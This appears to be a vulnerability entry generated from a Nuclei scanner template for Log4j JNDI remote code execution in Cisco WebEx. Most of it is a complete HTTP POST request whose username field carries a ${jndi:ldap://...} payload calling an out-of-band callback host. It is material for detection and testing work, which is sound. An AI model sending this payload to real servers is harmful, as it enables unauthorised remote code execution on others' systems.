# Vulnerability: Cisco WebEx - Remote Code Execution (Apache Log4j)
**Classification:** CWE-77,CWE-502
**Source:** Nuclei Template (`cisco-webex-log4j-rce.yaml`)

## Description
Cisco WebEx is susceptible to Log4j JNDI remote code execution. Cisco WebEx provides web conferencing, videoconferencing and contact center as a service applications.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /orion/login?siteurl=meet HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Referer: {{RootURL}}/orion/login?siteurl=meet&rnd=0.1359184728177283
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

type=getFailureTimes&username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}/{{str}}}&bAjax=true
```

